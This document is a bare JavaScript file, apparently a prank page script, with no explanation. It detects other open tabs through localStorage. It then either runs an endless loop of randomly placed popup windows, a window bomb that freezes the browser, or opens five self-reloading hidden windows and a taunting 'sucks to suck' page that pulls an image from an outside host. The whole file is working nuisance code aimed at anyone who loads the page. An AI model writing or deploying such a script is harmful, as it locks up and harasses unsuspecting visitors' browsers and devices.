alert("hello");
localStorage.openpages = Date.now();

  var anotherPageOpen = false;

  var onLocalStorageEvent = function(e){
    if (e.key == "openpages") {
      // Emit that you're already available.
      localStorage.page_available = Date.now();
    }
    if (e.key == "page_available") {
      // Another page is open
      anotherPageOpen = true;
    }
  };

  window.addEventListener('storage', onLocalStorageEvent, false);

  function checkOpenPages() {
    setTimeout(function() {
      if (anotherPageOpen) {
        function openWindow() {
          const newWin = window.open('', "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
          if (newWin) {
            const screenWidth = screen.width - 200; // Keep within bounds
            const screenHeight = screen.height - 180;

            const randomX = Math.floor(Math.random() * screenWidth);
            const randomY = Math.floor(Math.random() * screenHeight);

            newWin.moveTo(randomX, randomY);

            return newWin;
          }
        }
        while (true) openWindow();
      } else {
        // Open 4 small windows at the bottom of the screen
        for (let i = 0; i < 5; i++) {
          let newWin = window.open(window.location.href, '_blank', 'width=100,height=100,resizable=no,scrollbars=no');
          newWin.moveTo(screen.width, screen.height);
        }

        // Open a new tab with custom HTML content
        let newWindow = window.open('about:blank', '_blank');
        newWindow.document.write(`
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <title>Sucks to suck</title>
          </head>
          <body>
            <h1 style="text-align: center; font-size: 3em; margin-top: 0.2em;">sucks to suck</h1>
            <img style="z-index: -100; width: 100%; height: 100%; min-height: 100%; position: fixed; top: 65%; left: 50%; transform: translate(-50%, -50%);" src="https://rip.up.railway.app/laugh.gif">
          </body>
          </html>
        `);
      }
    }, 100);
  }

checkOpenPages();
